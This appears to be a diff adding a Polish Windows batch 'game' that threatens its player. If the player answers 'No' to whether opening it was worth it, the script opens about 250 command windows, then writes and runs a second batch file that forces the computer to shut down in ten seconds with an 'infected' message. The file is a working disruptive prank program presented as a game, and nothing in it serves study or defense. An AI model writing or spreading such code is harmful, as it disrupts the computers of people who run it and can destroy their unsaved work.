@@ -1,0 +1,330 @@
+@echo off
+color 2
+title Prosta Gra
+:lobby
+cls
+echo wybierz liczbe i kliknij enter.
+echo ===============================
+echo  Witaj w grze o twuj komputer!
+echo ===============================
+echo 1 - Zacznij gre
+echo 2 - Wyjdz z gry
+echo 3 - info
+echo ===============================
+set /p wybor= Wybierz opcje: 
+
+if "%wybor%"=="1" goto pytanie
+if "%wybor%"=="2" exit
+if "%wybor%"=="3" goto informacje
+
+
+:informacje
+cls
+echo wybierz liczbe i kliknij enter
+echo nie dobra odpowiedz bedzie ukarana 
+echo wybierz dobrze good luck!
+echo exit-9
+set /p odp= exit:
+
+if "%wybor%"=="9" goto lobby
+
+
+:pytanie
+cls
+echo ============================
+echo   Czy bylo warto otworzyc ten program?
+echo ============================
+echo 1 - Tak
+echo 2 - Nie
+echo ============================
+set /p odp= Wybierz opcje: 
+
+if "%odp%"=="1" (
+    echo Gratulacje! Wygrales, nie zostaniesz zwirusowany.
+    pause
+    exit
+)
+if "%odp%"=="2" goto wirus
+goto pytanie
+
+:wirus
+cls
+echo Uruchamiam wirusa...
+REM ============================
+REM 
+REM 
+REM 
+REM 
+REM shutdown /s /t 10 /c "Mówiłem, że to był zły wybór!"
+REM ============================
+
+:: === @echo
+
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+ ===
+echo @echo off > wirus.bat
+echo echo To jest wirus! >> wirus.bat
+echo shutdown /s /t 10 /c "Zostales zainfekowany!" >> wirus.bat
+start wirus.bat
+:: ==================================
+
+pause
+exit
